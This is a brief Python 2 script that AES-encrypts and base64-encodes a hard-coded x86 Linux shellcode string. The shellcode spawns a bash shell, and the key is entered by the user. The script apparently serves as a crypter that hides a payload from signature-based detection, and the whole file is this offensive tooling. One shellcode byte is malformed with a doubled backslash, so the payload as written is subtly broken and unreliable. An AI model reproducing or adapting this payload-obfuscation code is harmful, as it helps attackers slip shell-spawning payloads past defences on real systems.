from Crypto.Cipher import AES
import base64

key = raw_input('Please enter a key to encrypt the shellcode with: ')
Shellcode = '\x31\xc0\x50\x68\x62\x61\x73\x68\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f\x2f\x89\xe3\x50\x89\xe2\x53\x89\\xe1\xb0\x0b\xcd\x80'
blockSize = 16
padding = '?'
	
pad = lambda x: x + (blockSize - len(x) % blockSize) * padding
b64encodeAES = lambda y, x: base64.b64encode(y.encrypt(pad(x)))

cipher = AES.new(key)
encoded = b64encodeAES(cipher, Shellcode)


print 'Encrypted String: ' + encoded
